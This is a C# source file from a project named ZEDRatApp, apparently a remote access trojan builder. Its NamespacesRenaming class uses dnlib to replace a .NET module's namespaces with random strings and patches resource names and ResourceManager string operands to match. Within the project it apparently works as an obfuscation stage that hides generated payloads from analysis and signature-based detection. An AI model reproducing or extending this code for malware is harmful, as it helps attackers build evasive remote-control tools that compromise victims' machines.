using System.Collections.Generic;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using ZEDRatApp.Forms.RenamingObfuscation.Interfaces;

namespace ZEDRatApp.Forms.RenamingObfuscation.Classes
{
	public class NamespacesRenaming : IRenaming
	{
		private static Dictionary<string, string> _names = new Dictionary<string, string>();

		public ModuleDefMD Rename(ModuleDefMD module)
		{
			module.Name = Utils.GenerateRandomString();
			foreach (TypeDef type in module.GetTypes())
			{
				if (!type.IsGlobalModuleType && !(type.Namespace == ""))
				{
					if (NamespacesRenaming._names.TryGetValue(type.Namespace, out var value))
					{
						type.Namespace = value;
						continue;
					}
					string text = Utils.GenerateRandomString();
					NamespacesRenaming._names.Add(type.Namespace, text);
					type.Namespace = text;
				}
			}
			return NamespacesRenaming.ApplyChangesToResources(module);
		}

		private static ModuleDefMD ApplyChangesToResources(ModuleDefMD module)
		{
			foreach (Resource resource in module.Resources)
			{
				foreach (KeyValuePair<string, string> name in NamespacesRenaming._names)
				{
					if (resource.Name.Contains(name.Key))
					{
						resource.Name = resource.Name.Replace(name.Key, name.Value);
					}
				}
			}
			foreach (TypeDef type in module.GetTypes())
			{
				foreach (PropertyDef property in type.Properties)
				{
					if (property.Name != "ResourceManager")
					{
						continue;
					}
					IList<Instruction> instructions = property.GetMethod.Body.Instructions;
					for (int i = 0; i < instructions.Count; i++)
					{
						if (instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						foreach (KeyValuePair<string, string> name2 in NamespacesRenaming._names)
						{
							if (instructions[i].ToString().Contains(name2.Key))
							{
								instructions[i].Operand = instructions[i].Operand.ToString().Replace(name2.Key, name2.Value);
							}
						}
					}
				}
			}
			return module;
		}
	}
}
